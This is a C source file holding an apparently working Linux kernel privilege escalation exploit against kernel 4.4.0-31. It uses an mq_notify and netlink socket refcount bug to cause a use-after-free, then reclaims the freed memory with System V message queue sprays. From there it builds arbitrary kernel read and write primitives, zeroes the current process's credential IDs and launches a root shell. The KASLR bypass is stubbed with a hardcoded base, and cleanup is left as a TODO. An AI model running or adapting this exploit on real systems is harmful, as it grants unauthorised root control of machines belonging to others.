#define _GNU_SOURCE

#define NOTIFY_COOKIE_LEN 32
#define MSG_MSG_SIZE 48
#define NETLINK_SOCK_SIZE 1128
#define PAGESIZE 4096

#define SEARCH_RANGE 0x400000

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <unistd.h>
#include <mqueue.h>
#include <sys/signal.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/msg.h>
#include <sys/prctl.h>
#include <linux/netlink.h>
#include <pthread.h>
#include <errno.h>

#define _mq_notify(mqdes, sigevp) syscall(__NR_mq_notify, mqdes, sigevp)

//kernel version: 4.4.0-31-generic

struct {
	long type;
	char buf[(PAGESIZE - MSG_MSG_SIZE) + (NETLINK_SOCK_SIZE - sizeof(void*))];
	//char buf[NETLINK_SOCK_SIZE - MSG_MSG_SIZE];
} msg_payload;

bool done = false;
struct rdata {
	uint64_t nlk_groups;
} restore_data;

int msqid = -1;

void dbg() {
	puts("Paused");
	fflush(stdout);
	fgetc(stdin);
}

int cleanup(int sockfd) {
	if (sockfd == -1) {
		//exploit failed so early on that nothing can go wrong yet
		return -1;
	}
	
	//
	puts("[!] Kernel is about to OOF");
	
	
	
	dbg();
	return 0;
}

//unblock the thread that is blocking using mq_notify and return the duplicate fd number
void *unblock_func(void *fdparam) {
	//wait some time for mq_notify to block in the parent thread
	int *fdpair = fdparam;
	int fd = fdpair[0];
	sleep(2);
	
	//create duplicate netlink socket
	fdpair[1] = dup(fd);
	if (fdpair[1] < 0) {
		perror("[-] [unblock thread] create duplicate netlink socket");
		fflush(stdout);
		close(fd);
		pthread_exit(NULL);
	}
	printf("[unblock thread] Created duplicate netlink socket, fd = %d\n",  fdpair[1]);
	fflush(stdout);
	
	//close original netlink fd
	close(fd);
	printf("[unblock thread] Closed original netlink socket fd %d\n", fd);
	fflush(stdout);
	
	//wake up the parent thread using setsockopt and exit
	printf("[unblock thread] Unblocking the parent thread using setsockopt on fd %d ...\n", fdpair[1]);
	fflush(stdout);
	int val = 1;
	setsockopt(fdpair[1], SOL_NETLINK, NETLINK_NO_ENOBUFS, &val, sizeof(val));
	
	pthread_exit(NULL);
}

//use the bug to decrease the refcount of the socket with fd sockfd by 1 too much
int decrement_refcount(int sockfd) {
	//create unblocking thread, and then block on socket write
	pthread_t unblock_tid;
	int fdpair[2];
	fdpair[0] = sockfd;
	if (pthread_create(&unblock_tid, NULL, unblock_func, fdpair)) {
		perror("[-] create unblocking thread");
		close(sockfd);
		return -1;
	}
	printf("[*] Created unblocking thread, tid = 0x%lx\n", unblock_tid);
	
	//call mq_notify on the socket
	char sigev_data[NOTIFY_COOKIE_LEN];
	struct sigevent sigev;
	memset(&sigev, 0, sizeof(sigev));
	sigev.sigev_notify = SIGEV_THREAD;
	sigev.sigev_value.sival_ptr = sigev_data;
	sigev.sigev_signo = sockfd;
	printf("[*] Initialized struct sigevent at %p\n", &sigev);
	printf("[*] Blocking on mq_notify syscall ...\n");
	fflush(stdout);
	if (_mq_notify((mqd_t)(-1), &sigev)) {
		if (errno != EBADF) {
			perror("[-] mq_notify");
			close(fdpair[1]);
			return -1;
		}
	}
	puts("[+] mq_notify succeeded");
	
	return fdpair[1];
}

int prepare_blocking_socket() {
	//create receiver socket
	int recv_sockfd = socket(AF_NETLINK, SOCK_DGRAM, NETLINK_USERSOCK);
	if (recv_sockfd < 0) {
		perror("[-] Failed to create receiver socket");
		return -1;
	}
	printf("[*] Receiver socket created, fd = %d\n", recv_sockfd);
	
	//bind the receiver socket
	struct sockaddr_nl addr = {0};
	addr.nl_family = AF_NETLINK;
	addr.nl_pid = 1;	//autobind will take care of this
	addr.nl_groups = 0;	//want unicast, not multicast
	if (bind(recv_sockfd, (struct sockaddr *)&addr, sizeof(addr))) {
		//recv socket bind failed
		perror("[-] bind");
		close(recv_sockfd);
		return -1;
	}
	
	//prepare data to be used in flooding the socket
	static char buf[8192];
	memset(buf, 'A', sizeof(buf));
	struct iovec iov;
	iov.iov_base = buf;
	iov.iov_len = sizeof(buf);
	
	//initialize payload
	
	struct msghdr msg = {0};
	msg.msg_name = &addr;
	msg.msg_namelen = sizeof(addr);
	msg.msg_iov = &iov;
	msg.msg_iovlen = 1;
	msg.msg_flags = 0;
	
	puts("[*] Flooding receiver socket ...");
	while (sendmsg(recv_sockfd, &msg, MSG_DONTWAIT) > 0) {};
	if (errno != EAGAIN) {
		perror("[-] Receiver socket flood");
		close(recv_sockfd);
		return -1;
	}
	
	puts("[+] Receiver socket flood succeeded");
	return recv_sockfd;
}

uintptr_t get_kaslr_base() {
	return 0xffffffff81000000;
}

uint64_t arbread(int sockfd, uintptr_t kaddr) {
	union {
		uint64_t full;
		struct {
			uint32_t x;
			uint32_t y;
		};
	} leak;
	leak.full = 0x4141414141414141;
	struct sockaddr_nl addr;
	uintptr_t *arr = (uintptr_t *)&msg_payload.buf;
	
	//receive the message, modify groups ptr to kaddr, and send it back
	if (msgrcv(msqid, &msg_payload, sizeof(msg_payload.buf), 0, IPC_NOWAIT) < 0) {
		perror("[-] arbread: msgrcv without MSG_COPY");
		return -1;
	}
	arr[0x254] = kaddr;
	if (msgsnd(msqid, &msg_payload, sizeof(msg_payload.buf), 0)) {
		perror("[-] arbread send payload: msgsnd");
		return -1;
	}
	//read out an int at the specified location
	int addrlen = sizeof(addr);
	memset(&addr, 0, sizeof(addr));
	if (getsockname(sockfd, (struct sockaddr *)&addr, &addrlen)) {
		perror("[-] arbread: getsockname");
		return -1;
	}
	leak.x = addr.nl_groups;
	
	//repeat for kaddr + 4
	if (msgrcv(msqid, &msg_payload, sizeof(msg_payload.buf), 0, IPC_NOWAIT) < 0) {
		perror("[-] arbread: msgrcv without MSG_COPY");
		return -1;
	}
	arr[0x254] = kaddr + 4;
	if (msgsnd(msqid, &msg_payload, sizeof(msg_payload.buf), 0)) {
		perror("[-] arbread send payload: msgsnd");
		return -1;
	}
	addrlen = sizeof(addr);
	memset(&addr, 0, sizeof(addr));
	if (getsockname(sockfd, (struct sockaddr *)&addr, &addrlen)) {
		perror("[-] arbread: getsockname");
		return -1;
	}
	leak.y = addr.nl_groups;
	
	return leak.full;
}

int arbwrite4(int sockfd, uintptr_t kaddr) {
	struct sockaddr_nl addr;
	addr.nl_family = AF_NETLINK;
	addr.nl_groups = 0;
	addr.nl_pid = 128;
	
	//free the msg_msgseg chunk
	if (msgrcv(msqid, &msg_payload, sizeof(msg_payload.buf), 0, IPC_NOWAIT) < 0) {
		perror("[-] arbwrite: msgrcv without MSG_COPY");
		return -1;
	}
	
	//set elements of the controlled nlk struct to avoid crashing
	memset(&msg_payload.buf, 0, sizeof(msg_payload.buf));
	uint64_t *arr = (uint64_t *)&msg_payload.buf;
	arr[0x25a] = (uint64_t)(-1);		//nlk->bound = true
	arr[0x251] = addr.nl_pid;			//u32 nlk->portid = addr.nl_pid
	arr[0x278] = 0;						//nlk->netlink_bind = nullptr (function pointer)
	arr[0x254] = kaddr - 4;				//nlk->groups = kaddr - 4
	arr[0x253] = 100;					//uint32 nlk->subscriptions = 100 > 32
	
	//place it back
	if (msgsnd(msqid, &msg_payload, sizeof(msg_payload.buf), 0)) {
		perror("[-] arbwrite send payload: msgsnd");
		return -1;
	}
		
	//perform the arbitrary write
	if (bind(sockfd, (struct sockaddr *)&addr, sizeof(addr))) {
		//recv socket bind failed
		perror("[-] arbwrite: bind");
		return -1;
	}
}

int main(int argc, char **argv) {
	puts("[+] STAGE 0: Initialization");
	
	//initialize msg payload
	msg_payload.type = 0x1337;
	memset(msg_payload.buf, 0, sizeof(msg_payload.buf));
	
	//create message queues
	msqid = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
	if (msqid == -1) {
		perror("[-] Failed to create message queue");
		return -1;
	}
	printf("[*] Successfully initiated message queue, msqid = %d\n", msqid);

	puts("\n[+] STAGE 1: Trigger Early Free");
	//create blocking socket
	int blocked_sockfd = prepare_blocking_socket();
	if (blocked_sockfd == -1) {
		return -1;
	}
	printf("[+] Blocking socket ready, fd = %d\n", blocked_sockfd);
	
	//socket refcount is 2 (bind, called by prepare_blocking_socket above, increases the refcount by 1), so decrease it to 1.
	int newfd = decrement_refcount(blocked_sockfd);
	if (newfd == -1) {
		close(blocked_sockfd);
		return -1;
	}
	printf("[+] Decremented socket refcount, unblock socket fd now referred to by fd %d\n", newfd);
	
	//decrease it again to 0
	int sockfd = decrement_refcount(newfd);
	if (sockfd == -1) {
		close(newfd);
		return -1;
	}
	printf("[+] Decremented sock refcount, unblock socket fd now referred to by fd %d\n", sockfd);
	fflush(stdout);
	
	puts("\n[+] STAGE 2: Locate and Modify Target Credential Struct");
	
	//now the netlink sock is free, plant msg_msgseg with size sizeof(struct netlink_sock) = 1128 there to claim the hole
	if (msgsnd(msqid, &msg_payload, sizeof(msg_payload.buf), 0)) {
		perror("[-] initial msgsnd");
		return -1;
	}
	puts("[*] Attempted to insert a msg_msgseg struct into the hole left by netlink_sock");
	
	//TODO: how to bypass KASLR?
	uintptr_t kbase = get_kaslr_base();
	printf("[+] Found KASLR base 0x%lx (OK didn't actually find it, figure this out later)\n", kbase);
	
	//search for the current process's task struct.
	uintptr_t taskptr = kbase + 0xe11500;
	int pid = -1;
	union {
		uint64_t leak;
		struct {
			int pid;
			int other;
		};
	} parser;
	printf("[*] Searching for the current proccess's task struct, getpid() = %d ...\n", getpid());
	while (pid != getpid()) {
		taskptr = arbread(sockfd, taskptr + 0x338) - 0x330;
		parser.leak = arbread(sockfd, taskptr + 0x428);
		pid = parser.pid;
	}
	printf("[+] Found task struct for the current process at 0x%lx\n", taskptr);
	
	//retrieve credential struct location
	uintptr_t cred = arbread(sockfd, taskptr + 0x5d0);
	printf("[+] Located current process's credential struct at 0x%lx\n", cred);
	
	//zero out UID, GID, etc. in the credential struct
	for (uint64_t i = 1; i <= 8; i++) {
		arbwrite4(sockfd, cred + i*4);
	}
	printf("[*] Zeroed out UID, GID, etc. in credential struct 0x%lx\n", cred);
	
	//check for root
	if (!getuid()) {
		puts("[+] Got root!");
	}
	else {
		printf("[-] Failed to get root, UID = %d\n", getuid());
		return -1;
	}
	
	puts("\nSTAGE 3: Cleanup for netlink_release (TODO)");
	
	system("/bin/bash");
	
	puts("[-] Prepare to crash :<");
	dbg();
	return 0;
}
